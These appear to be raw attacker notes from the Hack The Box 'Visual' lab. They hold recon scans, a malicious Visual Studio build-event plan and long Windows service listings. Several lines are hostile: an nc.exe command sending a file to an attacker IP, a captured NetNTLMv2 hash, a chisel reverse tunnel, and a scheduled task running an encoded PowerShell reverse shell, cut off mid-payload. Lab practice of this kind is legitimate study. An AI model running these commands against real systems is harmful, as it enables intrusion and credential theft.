@@ -1,0 +1,893 @@
+visual
+10.10.11.234
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+┌──(kali㉿kali)-[~/stuffs/htb/visual.htb]
+└─$ nmap -sCV -Pn -p- --open 10.10.11.234 -o visual-nmap    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-30 04:37 EST
+Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 49.99% done; ETC: 04:40 (0:01:22 remaining)
+Nmap scan report for visual.htb (10.10.11.234)
+Host is up (0.052s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
+|_http-title: Visual - Revolutionizing Visual Studio Builds
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 183.77 seconds
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Apache httpd 2.4.56
+(Win64) OpenSSL/1.1.1t PHP/8.1.17
+
+http
+https
+
+
+
+dirsearch -u http://10.10.11.234:80/ -e "*" -x '400,403,404' -r
+http://10.10.11.234/cgi-bin/printenv.pl
+xampp
+REQUEST_URI="/cgi-bin/printenv.pl"
+SCRIPT_FILENAME="C:/xampp/cgi-bin/printenv.pl"
+SERVER_ADMIN="postmaster@localhost"
+
+wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.visual.htb" --hc 403,400 --hl 117 -t 50 10.10.11.234
+
+/info/refs?service=git-upload-pack
+
+http://10.10.16.30/VisualApp1/
+
+http://10.10.16.30/VisualApp1/VisualApp1.sln
+
+
+
+git --bare clone https://github.com/NS0507/VisualApp1.git repo-http
+cd repo-http/.git
+git --bare update-server-info
+cd ..
+python -m http.server 80
+
+http://10.10.16.30/.git
+
+<Project... >
+      :
+  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
+    <Exec Command="echo before" />
+  </Target>
+  <Target Name="PostBuild" AfterTargets="PostBuildEvent">
+    <Exec Command="echo after" />
+  </Target>
+      :
+</Project>
+
+visual\enox
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+PS C:\> Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running'}
+
+Name                   State   PathName                                                                          StartM
+                                                                                                                 ode   
+----                   -----   --------                                                                          ------
+ApacheHTTPServer       Running "C:\Xampp\apache\bin\httpd.exe" -k runservice                                     Auto  **
+BFE                    Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p               Auto  
+BrokerInfrastructure   Running C:\Windows\system32\svchost.exe -k DcomLaunch -p                                  Auto  
+CDPSvc                 Running C:\Windows\system32\svchost.exe -k LocalService -p                                Auto  
+ClipSVC                Running C:\Windows\System32\svchost.exe -k wsappx -p                                      Manual
+CompileService         Running C:\Program Files\nssm-2.24\win64\nssm.exe                                         Auto  **
+COMSysApp              Running C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235} Manual
+CoreMessagingRegistrar Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p                       Auto  
+CryptSvc               Running C:\Windows\system32\svchost.exe -k NetworkService -p                              Auto  
+DcomLaunch             Running C:\Windows\system32\svchost.exe -k DcomLaunch -p                                  Auto  
+Dhcp                   Running C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p               Auto  
+DiagTrack              Running C:\Windows\System32\svchost.exe -k utcsvc -p                                      Auto  
+Dnscache               Running C:\Windows\system32\svchost.exe -k NetworkService -p                              Auto  
+DPS                    Running C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork -p                       Auto  
+DsmSvc                 Running C:\Windows\system32\svchost.exe -k netsvcs -p                                     Manual
+DsSvc                  Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                Manual
+EventLog               Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p               Auto  
+EventSystem            Running C:\Windows\system32\svchost.exe -k LocalService -p                                Auto  
+FontCache              Running C:\Windows\system32\svchost.exe -k LocalService -p                                Auto  
+gpsvc                  Running C:\Windows\system32\svchost.exe -k netsvcs -p                                     Auto  
+iphlpsvc               Running C:\Windows\System32\svchost.exe -k NetSvcs -p                                     Auto  
+KeyIso                 Running C:\Windows\system32\lsass.exe                                                     Manual
+LanmanServer           Running C:\Windows\System32\svchost.exe -k smbsvcs                                        Auto  
+LanmanWorkstation      Running C:\Windows\System32\svchost.exe -k NetworkService -p                              Auto  
+LicenseManager         Running C:\Windows\System32\svchost.exe -k LocalService -p                                Manual
+lmhosts                Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p               Manual
+LSM                    Running                                                                                   Unk...
+mpssvc                 Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p               Auto  
+MSDTC                  Running C:\Windows\System32\msdtc.exe                                                     Auto  
+NcbService             Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                Manual
+netprofm               Running C:\Windows\System32\svchost.exe -k LocalService -p                                Manual
+NlaSvc                 Running C:\Windows\System32\svchost.exe -k NetworkService -p                              Auto  
+nsi                    Running C:\Windows\system32\svchost.exe -k LocalService -p                                Auto  
+PcaSvc                 Running C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                Manual
+PlugPlay               Running C:\Windows\system32\svchost.exe -k DcomLaunch -p                                  Manual
+PolicyAgent            Running C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted -p             Manual
+Power                  Running C:\Windows\system32\svchost.exe -k DcomLaunch -p                                  Auto  
+ProfSvc                Running C:\Windows\system32\svchost.exe -k netsvcs -p                                     Auto  
+RpcEptMapper           Running C:\Windows\system32\svchost.exe -k RPCSS -p                                       Auto  
+RpcSs                  Running C:\Windows\system32\svchost.exe -k rpcss -p                                       Auto  
+SamSs                  Running C:\Windows\system32\lsass.exe                                                     Auto  
+Schedule               Running C:\Windows\system32\svchost.exe -k netsvcs -p                                     Auto  
+SENS                   Running C:\Windows\system32\svchost.exe -k netsvcs -p                                     Auto  
+ShellHWDetection       Running C:\Windows\System32\svchost.exe -k netsvcs -p                                     Auto  
+SysMain                Running C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                Auto  
+SystemEventsBroker     Running C:\Windows\system32\svchost.exe -k DcomLaunch -p                                  Auto  
+Themes                 Running C:\Windows\System32\svchost.exe -k netsvcs -p                                     Auto  
+TimeBrokerSvc          Running C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p               Manual
+TrkWks                 Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                Auto  
+UALSVC                 Running C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                Auto  
+UserManager            Running C:\Windows\system32\svchost.exe -k netsvcs -p                                     Auto  
+UsoSvc                 Running C:\Windows\system32\svchost.exe -k netsvcs -p                                     Auto  
+VGAuthService          Running "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"            Auto  
+vm3dservice            Running C:\Windows\system32\vm3dservice.exe                                               Auto  
+VMTools                Running "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                               Auto  
+W32Time                Running C:\Windows\system32\svchost.exe -k LocalService                                   Auto  
+Wcmsvc                 Running C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p               Auto  
+WinHttpAutoProxySvc    Running C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p               Manual
+Winmgmt                Running C:\Windows\system32\svchost.exe -k netsvcs -p                                     Auto  
+WinRM                  Running C:\Windows\System32\svchost.exe -k NetworkService -p                              Auto  
+wlidsvc                Running C:\Windows\system32\svchost.exe -k netsvcs -p                                     Manual
+WpnService             Running C:\Windows\system32\svchost.exe -k netsvcs -p                                     Auto  
+
+
+
+PS C:\> Get-Service |Where-Object {$_.Status -like 'running'}|Format-List
+
+
+Name                : ApacheHTTPServer
+DisplayName         : Apache HTTP Server
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {Afd, Tcpip}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess
+
+Name                : BFE
+DisplayName         : Base Filtering Engine
+Status              : Running
+DependentServices   : 
+ServicesDependedOn  : {RpcSs}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32ShareProcess
+
+Name                : BrokerInfrastructure
+DisplayName         : Background Tasks Infrastructure Service
+Status              : Running
+DependentServices   : 
+ServicesDependedOn  : {DcomLaunch, RpcEptMapper, RpcSs}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : False
+ServiceType         : Win32ShareProcess
+
+Name                : CDPSvc
+DisplayName         : Connected Devices Platform Service
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {Tcpip, RpcSS, ncbservice}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : CompileService
+DisplayName         : CompileService
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {}
+CanPauseAndContinue : True
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess
+
+Name                : COMSysApp
+DisplayName         : COM+ System Application
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {RpcSs, SENS, EventSystem}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess
+
+Name                : CoreMessagingRegistrar
+DisplayName         : CoreMessaging
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {rpcss}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : False
+ServiceType         : Win32ShareProcess
+
+Name                : CryptSvc
+DisplayName         : Cryptographic Services
+Status              : Running
+DependentServices   : {applockerfltr, AppIDSvc}
+ServicesDependedOn  : {RpcSs}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : DcomLaunch
+DisplayName         : DCOM Server Process Launcher
+Status              : Running
+DependentServices   : 
+ServicesDependedOn  : {}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : False
+ServiceType         : Win32ShareProcess
+
+Name                : Dhcp
+DisplayName         : DHCP Client
+Status              : Running
+DependentServices   : {NcaSvc, iphlpsvc, WinHttpAutoProxySvc, AppVClient...}
+ServicesDependedOn  : {Afd, NSI}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : DiagTrack
+DisplayName         : Connected User Experiences and Telemetry
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {RpcSs}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess
+
+Name                : Dnscache
+DisplayName         : DNS Client
+Status              : Running
+DependentServices   : {RemoteAccess, RasMan, NcaSvc}
+ServicesDependedOn  : {nsi}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : False
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : DPS
+DisplayName         : Diagnostic Policy Service
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : DsmSvc
+DisplayName         : Device Setup Manager
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {RpcSs}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : DsSvc
+DisplayName         : Data Sharing Service
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : EventLog
+DisplayName         : Windows Event Log
+Status              : Running
+DependentServices   : {Wecsvc, AppVClient, netprofm, NlaSvc}
+ServicesDependedOn  : {}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : EventSystem
+DisplayName         : COM+ Event System
+Status              : Running
+DependentServices   : {COMSysApp, SENS}
+ServicesDependedOn  : {rpcss}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : FontCache
+DisplayName         : Windows Font Cache Service
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : gpsvc
+DisplayName         : Group Policy Client
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {Mup, RPCSS}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : iphlpsvc
+DisplayName         : IP Helper
+Status              : Running
+DependentServices   : {NcaSvc}
+ServicesDependedOn  : {tcpip, winmgmt, RpcSS, nsi...}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : KeyIso
+DisplayName         : CNG Key Isolation
+Status              : Running
+DependentServices   : {dot3svc, Eaphost}
+ServicesDependedOn  : {RpcSs}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32ShareProcess
+
+Name                : LanmanServer
+DisplayName         : Server
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {Srv2, SamSS}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : LanmanWorkstation
+DisplayName         : Workstation
+Status              : Running
+DependentServices   : {SessionEnv, Netlogon}
+ServicesDependedOn  : {NSI, MRxSmb20, Bowser}
+CanPauseAndContinue : True
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : LicenseManager
+DisplayName         : Windows License Manager Service
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {rpcss}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : lmhosts
+DisplayName         : TCP/IP NetBIOS Helper
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {Afd}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : LSM
+DisplayName         : Local Session Manager
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {DcomLaunch, RpcEptMapper, RpcSs}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : False
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : mpssvc
+DisplayName         : Windows Defender Firewall
+Status              : Running
+DependentServices   : 
+ServicesDependedOn  : {bfe, mpsdrv}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : False
+ServiceType         : Win32ShareProcess
+
+Name                : MSDTC
+DisplayName         : Distributed Transaction Coordinator
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {SamSS, RPCSS}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess
+
+Name                : NcbService
+DisplayName         : Network Connection Broker
+Status              : Running
+DependentServices   : {CDPSvc}
+ServicesDependedOn  : {RpcSS, tcpip}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : netprofm
+DisplayName         : Network List Service
+Status              : Running
+DependentServices   : {AppVClient}
+ServicesDependedOn  : {nlasvc, RpcSs}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : NlaSvc
+DisplayName         : Network Location Awareness
+Status              : Running
+DependentServices   : {AppVClient, netprofm}
+ServicesDependedOn  : {NSI, TcpIp, Dhcp, Eventlog...}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : nsi
+DisplayName         : Network Store Interface Service
+Status              : Running
+DependentServices   : {icssvc, Wcmsvc, AppVClient, netprofm...}
+ServicesDependedOn  : {rpcss, nsiproxy}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : PcaSvc
+DisplayName         : Program Compatibility Assistant Service
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {RpcSs}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : PlugPlay
+DisplayName         : Plug and Play
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : PolicyAgent
+DisplayName         : IPsec Policy Agent
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {bfe, Tcpip}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : Power
+DisplayName         : Power
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : False
+ServiceType         : Win32ShareProcess
+
+Name                : ProfSvc
+DisplayName         : User Profile Service
+Status              : Running
+DependentServices   : {TokenBroker, UserManager, shpamsvc, Appinfo}
+ServicesDependedOn  : {RpcSs}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : RpcEptMapper
+DisplayName         : RPC Endpoint Mapper
+Status              : Running
+DependentServices   : 
+ServicesDependedOn  : {}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : False
+ServiceType         : Win32ShareProcess
+
+Name                : RpcSs
+DisplayName         : Remote Procedure Call (RPC)
+Status              : Running
+DependentServices   : 
+ServicesDependedOn  : {DcomLaunch, RpcEptMapper}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : False
+ServiceType         : Win32ShareProcess
+
+Name                : SamSs
+DisplayName         : Security Accounts Manager
+Status              : Running
+DependentServices   : {MSDTC, LanmanServer, KtmRm}
+ServicesDependedOn  : {RPCSS}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : False
+ServiceType         : Win32ShareProcess
+
+Name                : Schedule
+DisplayName         : Task Scheduler
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {SystemEventsBroker, RPCSS}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : SENS
+DisplayName         : System Event Notification Service
+Status              : Running
+DependentServices   : {COMSysApp}
+ServicesDependedOn  : {EventSystem}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : ShellHWDetection
+DisplayName         : Shell Hardware Detection
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {RpcSs}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : SysMain
+DisplayName         : SysMain
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {rpcss}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : SystemEventsBroker
+DisplayName         : System Events Broker
+Status              : Running
+DependentServices   : 
+ServicesDependedOn  : {RpcSs, RpcEptMapper}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32ShareProcess
+
+Name                : Themes
+DisplayName         : Themes
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : TimeBrokerSvc
+DisplayName         : Time Broker
+Status              : Running
+DependentServices   : 
+ServicesDependedOn  : {}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : TrkWks
+DisplayName         : Distributed Link Tracking Client
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {RpcSs}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : UALSVC
+DisplayName         : User Access Logging Service
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {WinMgmt}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : UserManager
+DisplayName         : User Manager
+Status              : Running
+DependentServices   : {TokenBroker}
+ServicesDependedOn  : {RpcSs, ProfSvc}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : UsoSvc
+DisplayName         : Update Orchestrator Service
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {rpcss}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : VGAuthService
+DisplayName         : VMware Alias Manager and Ticket Service
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess
+
+Name                : vm3dservice
+DisplayName         : VMware SVGA Helper Service
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess
+
+Name                : VMTools
+DisplayName         : VMware Tools
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {}
+CanPauseAndContinue : True
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess
+
+Name                : W32Time
+DisplayName         : Windows Time
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : Wcmsvc
+DisplayName         : Windows Connection Manager
+Status              : Running
+DependentServices   : {icssvc}
+ServicesDependedOn  : {RpcSs, NSI}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess
+
+Name                : WinHttpAutoProxySvc
+DisplayName         : WinHTTP Web Proxy Auto-Discovery Service
+Status              : Running
+DependentServices   : {NcaSvc, iphlpsvc}
+ServicesDependedOn  : {Dhcp}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : False
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : Winmgmt
+DisplayName         : Windows Management Instrumentation
+Status              : Running
+DependentServices   : {UALSVC, NcaSvc, iphlpsvc}
+ServicesDependedOn  : {RPCSS}
+CanPauseAndContinue : True
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : WinRM
+DisplayName         : Windows Remote Management (WS-Management)
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {HTTP, RPCSS}
+CanPauseAndContinue : False
+CanShutdown         : True
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+Name                : WpnService
+DisplayName         : Windows Push Notifications System Service
+Status              : Running
+DependentServices   : {}
+ServicesDependedOn  : {rpcss}
+CanPauseAndContinue : False
+CanShutdown         : False
+CanStop             : True
+ServiceType         : Win32OwnProcess, Win32ShareProcess
+
+
+icacls "C:\Program Files\nssm-2.24\win64\nssm.exe"
+
+
+icacls "C:\Program Files\VMware"
+Get-CimInstance -ClassName win32_service | Select Name,StartMode| Where-Object {$_.Name -like 'ApacheHTTPServer'}
+
+Get-CIMInstance -Class Win32_Service | Select-Object *|select name, StartName, PathName
+
+
+./nc.exe -w 3 10.10.16.30 1234 < out.txt
+
+
+Get-ChildItem -Path C:\ -Include scripts.js -File -Recurse -ErrorAction SilentlyContinue
+	
+
+PS C:\xampp\htdocs> Get-ScheduledTask | Get-ScheduledTaskInfo |Where-Object {$_.NextRunTime -ne $null}|select TaskName, NextRunTime                                            
+                                                                                                                                                                               
+TaskName                                             NextRunTime                                                                                                               
+--------                                             -----------                                                                                                               
+AD RMS Rights Policy Template Management (Automated) 12/1/2023 3:15:15 AM                                                                                                      
+Microsoft Compatibility Appraiser                    12/1/2023 4:49:49 AM                                                                                                      
+Consolidator                                         12/1/2023 6:00:00 AM                                                                                                      
+Data Integrity Scan                                  12/22/2023 10:35:35 AM                                                                                                    
+Device                                               12/1/2023 3:32:32 AM                                                                                                      
+Property Definition Sync                             12/1/2023 5:41:41 AM                                                                                                      
+ScanForUpdates                                       12/2/2023 6:37:37 AM                                                                                                      
+RefreshCache                                         12/2/2023 12:07:07 AM                                                                                                     
+WakeUpAndScanForUpdates                              12/1/2023 4:18:18 PM                                                                                                      
+MapsUpdateTask                                       12/2/2023 1:43:43 AM                                                                                                      
+Background Synchronization                           12/1/2023 2:15:15 AM                                                                                                      
+Collection                                           12/1/2023 1:14:14 AM                                                                                                      
+Registration                                         12/1/2023 8:47:47 AM                                                                                                      
+Storage Tiers Optimization                           12/1/2023 1:00:00 AM                                                                                                      
+QueueReporting                                       12/1/2023 12:48:48 AM                                                                                                     
+Scheduled Start                                      12/1/2023 10:16:16 PM 
+
+
+RmSvc
+Get-Service | Format-List
+
+  Hash:    enox::VISUAL:1122334455667788:4201a44b23a35ca71605f55d7828f803:0101000000000000183f467b2124da01b6d37cf223748269000000000800300030000000000000000000000000300000e0f960f16ffeb30a8203fae19afced30d8064155ce9a46b1fcac8e6bdb76a0560a00100000000000000000000000000000000000090000000000000000000000  
+
+"C:\Users\All Users\ntuser.pol"
+
+
+./chisel64 server --port 8888 --reverse
+./chisel64.exe client 10.10.16.30:8888 R:socks
+
+
+ref: https://itm4n.github.io/localservice-privileges/
+
+# Create a list of privileges 
+[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseQuotaPrivilege", "SeShutdownPrivilege", "SeUndockPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege" 
+# Create a Principal for the task 
+$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs 
+
+# Create an action for the task 
+$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbAB